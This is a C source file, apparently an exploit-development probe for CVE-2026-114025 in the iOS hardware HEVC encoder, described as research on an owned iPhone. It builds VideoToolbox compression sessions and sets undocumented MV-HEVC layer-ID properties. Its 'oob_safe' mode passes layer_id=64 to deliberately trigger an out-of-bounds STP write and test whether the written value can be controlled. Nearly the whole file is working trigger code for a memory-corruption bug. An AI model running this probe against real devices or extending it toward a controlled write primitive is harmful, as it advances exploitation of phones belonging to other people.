/*
 * ave_pps_value_probe.c — CVE-2026-114025 PPS Written Value Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key question: Can we control the second 4 bytes (w20) written by the
 * OOB STP instruction through VideoToolbox session properties?
 *
 * From cascade trace:
 *   HEVC_PPS at 0x1943dac writes STP w19,w20 where:
 *     w19 = 3 (NAL type, fixed)
 *     w20 = x21 = 4th arg to PPS function (from encode config)
 *
 * This probe sets various PPS-related properties and monitors whether
 * the encode succeeds with different configurations, indicating the
 * value path is reachable.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVEPPSValueProbe ave_pps_value_probe.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.aveppsvalue
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static int g_cb_status = -999;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    if (buf) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
        if (fmt) {
            size_t pset_count = 0;
            OSStatus ps = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, 0, NULL, NULL, &pset_count, NULL);
            rlog("  [CB] status=%d, paramSetCount=%zu\n", status, pset_count);

            for (size_t i = 0; i < pset_count && i < 10; i++) {
                const uint8_t *pset = NULL;
                size_t pset_size = 0;
                int nal_type = -1;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fmt, i, &pset, &pset_size, NULL, &nal_type);
                rlog("  [CB] paramSet[%zu]: nalType=%d, size=%zu", i, nal_type, pset_size);
                if (pset && pset_size > 0 && pset_size <= 32) {
                    rlog(", hex=");
                    for (size_t j = 0; j < pset_size && j < 16; j++)
                        rlog("%02x", pset[j]);
                    if (pset_size > 16) rlog("...");
                }
                rlog("\n");
            }
        }
    }
}

static CVPixelBufferRef create_pixel_buffer(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static void test_pps_config(const char *label, int layer_id,
                            const char *profile, int qp, int bframes,
                            int entropy_mode, int width, int height) {
    rlog("\n--- Test: %s ---\n", label);
    rlog("  layer_id=%d, profile=%s, qp=%d, bframes=%d, entropy=%d, %dx%d\n",
         layer_id, profile, qp, bframes, entropy_mode, width, height);

    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    g_cb_status = -999;
    OSStatus st = VTCompressionSessionCreate(NULL, width, height,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("  CREATE FAILED: %d\n", (int)st);
        return;
    }

    CFStringRef prof_str = CFStringCreateWithCString(NULL, profile, kCFStringEncodingUTF8);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, prof_str);
    CFRelease(prof_str);

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    if (qp >= 0) {
        CFNumberRef qpn = CFNumberCreate(NULL, kCFNumberIntType, &qp);
        VTSessionSetProperty(session, CFSTR("ConstantQP"), qpn);
        CFRelease(qpn);
    }

    if (bframes >= 0) {
        CFNumberRef bfn = CFNumberCreate(NULL, kCFNumberIntType, &bframes);
        VTSessionSetProperty(session, CFSTR("MaxBFrames"), bfn);
        CFRelease(bfn);
    }

    if (entropy_mode >= 0) {
        CFNumberRef emn = CFNumberCreate(NULL, kCFNumberIntType, &entropy_mode);
        VTSessionSetProperty(session, CFSTR("EntropyMode"), emn);
        CFRelease(emn);
    }

    int base_layer = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    rlog("  prepare: %d\n", (int)st);

    if (st == noErr) {
        CVPixelBufferRef pb = create_pixel_buffer(width, height);
        if (pb) {
            CMTime pts = CMTimeMake(0, 30);
            CMTime dur = CMTimeMake(1, 30);
            st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
            rlog("  encode: %d\n", (int)st);
            if (st == noErr) {
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                usleep(500000);
            }
            CVPixelBufferRelease(pb);
        }
    }
    rlog("  callback status: %d\n", g_cb_status);

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_pps_value.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 PPS Written Value Probe ===\n");
    rlog("Target: determine if w20 in STP w19,w20 is controllable\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "safe";

    if (strcmp(mode, "safe") == 0) {
        rlog("\n== SAFE MODE: layer_id=1 (valid range), varying PPS params ==\n");

        test_pps_config("baseline", 1, "HEVC_Main_AutoLevel", -1, -1, -1, 128, 128);
        test_pps_config("qp=10", 1, "HEVC_Main_AutoLevel", 10, -1, -1, 128, 128);
        test_pps_config("qp=51", 1, "HEVC_Main_AutoLevel", 51, -1, -1, 128, 128);
        test_pps_config("bframes=2", 1, "HEVC_Main_AutoLevel", -1, 2, -1, 128, 128);
        test_pps_config("entropy=0", 1, "HEVC_Main_AutoLevel", -1, -1, 0, 128, 128);
        test_pps_config("entropy=1", 1, "HEVC_Main_AutoLevel", -1, -1, 1, 128, 128);
        test_pps_config("main10", 1, "HEVC_Main10_AutoLevel", -1, -1, -1, 128, 128);
        test_pps_config("large", 1, "HEVC_Main_AutoLevel", -1, -1, -1, 1920, 1080);

    } else if (strcmp(mode, "oob_safe") == 0) {
        rlog("\n== OOB-SAFE: layer_id=64 (intra-object OOB), varying PPS params ==\n");
        rlog("== These writes stay inside the encoder object ==\n");

        test_pps_config("lid64_base", 64, "HEVC_Main_AutoLevel", -1, -1, -1, 128, 128);
        test_pps_config("lid64_qp10", 64, "HEVC_Main_AutoLevel", 10, -1, -1, 128, 128);
        test_pps_config("lid64_qp51", 64, "HEVC_Main_AutoLevel", 51, -1, -1, 128, 128);
        test_pps_config("lid64_main10", 64, "HEVC_Main10_AutoLevel", -1, -1, -1, 128, 128);

    } else if (strcmp(mode, "dump") == 0) {
        rlog("\n== DUMP: Encode and dump all HEVC parameter sets ==\n");

        test_pps_config("dump_lid1", 1, "HEVC_Main_AutoLevel", -1, -1, -1, 128, 128);
        test_pps_config("dump_lid2", 2, "HEVC_Main_AutoLevel", -1, -1, -1, 128, 128);
        test_pps_config("dump_lid3", 3, "HEVC_Main_AutoLevel", -1, -1, -1, 128, 128);

    } else {
        rlog("Usage: AVEPPSValueProbe <mode>\n");
        rlog("  safe      -- vary PPS params with valid layer_id=1\n");
        rlog("  oob_safe  -- vary PPS params with intra-object layer_id=64\n");
        rlog("  dump      -- dump HEVC parameter sets from encoded frames\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
